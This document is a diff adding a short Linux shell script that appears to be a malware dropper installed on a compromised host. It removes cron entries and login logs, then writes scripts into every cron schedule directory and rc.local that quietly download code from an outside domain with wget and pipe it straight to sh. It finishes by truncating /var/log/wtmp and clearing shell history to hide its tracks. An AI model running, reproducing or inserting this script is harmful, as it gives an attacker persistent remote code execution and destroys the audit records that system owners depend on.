@@ -1,0 +1,17 @@
+rm -rf /etc/cron.hourly/0
+rm -rf /etc/cron.daily/0
+rm -rf /etc/cron.weekly/0
+rm -rf /etc/cron.monthly/0
+rm -rf /var/log/wtmp
+echo -e '#!/bin/sh\n\nwget --quiet http://suckmyass.ga/.x -O- 3>/dev/null|sh>/dev/null 2>&1' > /etc/cron.hourly/2;chmod +x /etc/cron.hourly/2;
+
+echo -e '#!/bin/sh\n\nwget --quiet http://suckmyass.ga/.x -O- 3>/dev/null|sh>/dev/null 2>&1' > /etc/cron.daily/2;chmod +x /etc/cron.daily/2;
+
+echo -e '#!/bin/sh\n\nwget --quiet http://suckmyass.ga/.x -O- 3>/dev/null|sh>/dev/null 2>&1' > /etc/cron.weekly/2;chmod +x /etc/cron.weekly/2;
+
+echo -e '#!/bin/sh\n\nwget --quiet http://suckmyass.ga/.x -O- 3>/dev/null|sh>/dev/null 2>&1' > /etc/cron.monthly/2;chmod 777 /etc/cron.monthly/2;
+
+echo -e '#!/bin/sh\n\nwget --quiet http://suckmyass.ga/.x -O- 3>/dev/null|sh>/dev/null 2>&1' > /etc/rc.local;chmod +x /etc/rc.local;
+head -c -384 /var/log/wtmp > .wtmp; mv .wtmp /var/log/wtmp; chmod 664 /var/log/wtmp; chown root:utmp /var/log/wtmp;
+history -c;
+unset history;history -w
